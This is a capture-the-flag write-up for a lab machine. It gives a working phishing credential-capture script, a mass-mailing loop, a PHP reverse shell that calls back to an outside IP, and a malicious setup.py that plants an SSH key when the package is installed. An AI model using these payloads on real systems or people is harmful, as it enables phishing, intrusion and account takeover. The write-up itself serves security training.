@@ -1,0 +1,237 @@
+SneakyMailer
+
+24th November 2020 / Document No D20.100.97
+Prepared By: MrR3boot
+Machine Author(s): sulcud
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+SneakyMailer is a medium difficulty Linux machine that features a phishing scenario, from which
+a set of credentials are gained. These credentials provide access to a mailbox, which reveals
+another set of credentials to access the FTP service. FTP file upload allows a foothold to be
+gained. PyPI server package installation can be exploited to move laterally. Root access can be
+obtained by leveraging sudo privileges.
+
+Skills Required
+
+      Python/Bash Scripting
+
+Skills Learned
+
+      Phishing
+      PyPI Package Exploitation
+      pip3 Exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.197 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.197
+
+Nmap output reveals that the target server has ports 21 (FTP), 22 (OpenSSH), 25 (Postfix), 80 &
+8080 (Nginx), 143 (Imapd) and 993 (Imapd SSL) available. Nmap didn't state that FTP anonymous
+authentication was permitted.
+Nginx
+
+Browsing to port 80 redirects us to sneakycorp.htb .
+
+This can also be viewed with curl utility.
+
+Let's add sneakycorp.htb to /etc/hosts .
+   10.10.10.197 sneakycorp.htb
+We can now access the application using the domain name.
+
+The page highlights two projects that the Sneaky Corp organization are working with. The PyPI
+project is still in the testing phase, while the mail server configuration has been completed.
+Let's browse to Team page.
+
+We have a long list of team members, including their email addresses. Let's save them to
+emails.txt .
+
+   curl http://sneakycorp.htb/team.php | grep '@' | awk
+   '{gsub(/<[^>]*>/,"");print;}' | tr -d ' ' > emails.txt
+As we have list of email IDs and a postfix server running on the target, we can attempt to
+perform a phishing attack on each team member by sending a link. Before doing that let's look
+for potential URLs which they might be enticed to open.
+
+FFUF
+Let's enumerate any files/folders hosted on the web server using ffuf.
+   ffuf -u http://sneakycorp.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-
+   list-1.0.txt
+
+We see a pypi directory. Let's fuzz this for PHP files.
+
+A register.php page is present. Let's browse to that.
+The company employees would probably not be suspicious about their internal IT asking them to
+register an account on this site. Let's save the register.php page and replace the hyperlinks to
+point to the actual site by issuing the below commands.
+
+   mkdir templates
+   curl http://sneakycorp.htb/pypi/register.php -o templates/register.php
+   sed -i 's/\/vendor/http:\/\/sneakycorp.htb\/vendor/g' templates/register.php
+   sed -i 's/\/css\//http:\/\/sneakycorp.htb\/css\//g' templates/register.php
+
+We can now host the page in a web server. The below script starts a web server on port 80 and
+prints whatever content is received from a POST request, allowing us to capture any inputted
+employee credentials. It then submits the content to the actual site and redirects them to the
+original application.
+
+   from flask import *
+   import requests
+
+   app = Flask(__name__)
+
+   @app.route('/pypi/register.php',methods=['GET','POST'])
+   def register():
+
+                 if request.method=="GET":
+                                return render_template("register.php")
+
+                 else:
+                                print(request.args)
+                                print(request.form)
+
+     requests.post('http://sneakycorp.htb/pypi/register.php',data=request.form)
+                                return redirect('http://sneakycorp.htb',code=302)
+
+   app.run('0.0.0.0',80)
+
+We can send the phishing emails using the swaks utility. Let's run the below script to send an
+email to each team member from a targetted person in the organization.
+   while read email; do
+       echo "[+] Sending email from $email"
+          swaks --from support@sneakymailer.htb --to $email --header 'Subject:
+
+   Register in the portal' --body 'http://10.10.14.23/pypi/register.php' --server
+   sneakycorp.htb >/dev/null
+   done < emails.txt
+
+After a short while, we receive a set of credentials from the user Paul Byrd . Attempting to reuse
+these credentials on SSH and FTP services is not successful. Let's try to login to the mail server
+using the evolution or thunderbird client.
+
+Input the above configuration, and click the Apply button, after which the application prompts
+us for password of the paulbyrd account.
+After providing the password we can login to the account. There are two emails present in the
+Sent Items folder.
+
+The password reset mail contains credentials for the developer account.
+Foothold
+
+We can login to FTP server using these credentials.
+
+There's a dev folder that contains source code files.
+
+We can try to upload a file there and see if it's accessible using the sneakycorp.htb virtual host.
+
+We see that the file is uploaded but it's not present on sneakycorp.htb . Let's attempt to
+bruteforce subdomains using ffuf .
+ We see that a dev subdomain exists. Let's add that to our hosts file.
+   10.10.10.197 sneakycorp.htb dev.sneakycorp.htb
+Browsing to dev.sneakycorp.htb we see that the file is present.
+
+Let's upload a PHP reverse shell.
+   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/1234 0>&1'"); ?>
+
+Stand up a listener on port 1234 and access dev.sneakycorp.htb/shell.php . We receive a
+reverse shell as the user www-data .
+Lateral Movement
+
+In the /var/www directory we see another virtual host name.
+
+The second email in Paul's mailbox mentions about testing the Python module installation
+through the PyPI service.
+
+Let's also add pypi.sneakycorp.htb to our hosts file.
+   10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb
+
+Checking the Nginx configuration for the pypi vhost reveals that the service is running on
+localhost port 5000, and is made accessible through port 8080 of the Nginx server.
+
+Let's access the pypiserver on port 8080.
+Clicking on the package link prompts for authentication. On exploring the configuration folder we
+see a .htpasswd file with an encrypted password.
+
+Let's save the hash locally and try to crack it with Hashcat or John The Ripper.
+
+With the pypi / soufianeelhaoui credentials we can gain access to the packages link.
+
+Python Packet Index (PyPI) is a repository that can store Python modules, packages and
+libraries. Users can install them later using pip . We need to create a package which gets
+installed by the low user as mentioned in the email. We can refer to official Python
+documentation in order to create a package.
+First, create the following folder structure.
+ setup.py
+ [package name]
+
+        __init__.py
+
+__init__.py can be empty. setup.py should contain the following.
+
+import setuptools
+
+setuptools.setup(
+                     name="test_pkg",
+                     packages=['test_pkg'],
+
+              )
+
+Let's modify setup.py to create a file in /tmp .
+
+import setuptools
+
+try:
+
+      with open("/tmp/test","w") as f:
+             f.write("test")
+
+except:
+              setuptools.setup(
+                     name="test_pkg",
+                     packages=['test_pkg'],
+              )
+
+To upload the package to the remote PyPI server we have to create a .pypirc file, which will
+allow us to authenticate to the server.
+
+[distutils]
+index-servers =
+
+       remote
+
+[local]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+
+We can now try to upload the package by issuing command below.
+
+python3 setup.py sdist upload -r remote
+Here, -r is used to point to the repository that we are working with. We see that the file
+/tmp/test is created in the context of the user low .
+
+Let's modify setup.py to upload our public key to the server.
+
+import setuptools
+
+try:
+
+      with open("/home/low/.ssh/authorized_keys","w") as f:
+             f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8xcuG<SNIP>")
+
+except:
+              setuptools.setup(
+                     name="test_pkg",
+                     packages=['test_pkg'],
+              )
+
+We can now login to SSH as low .
+Privilege Escalation
+
+Enumerating the user privileges, it's found that low has been assigned sudo privileges to run
+pip3 as root.
+
+We can follow the GTFOBins reference to obtain a root shell.
+
